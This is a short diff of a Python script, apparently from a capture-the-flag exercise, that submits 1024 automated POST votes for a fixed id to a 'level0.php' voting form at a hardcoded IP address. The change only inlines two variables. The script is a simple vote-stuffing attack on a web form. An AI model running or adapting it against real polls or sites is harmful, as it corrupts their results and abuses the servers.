@@ -2,11 +2,10 @@
 import requests
 
 success_votes = 0
-user_id = 3414
 number_print = 1024
-votation = {'id': user_id, 'holdthedoor': 'Submit'}
+votation = {'id': '3414', 'holdthedoor': 'Submit'}
 
-for i in range(0, number_print):
+for i in range(0, 1024):
     r = requests.post('http://158.69.76.135/level0.php', data=votation)
     if r.status_code == 200:
         success_votes +=1
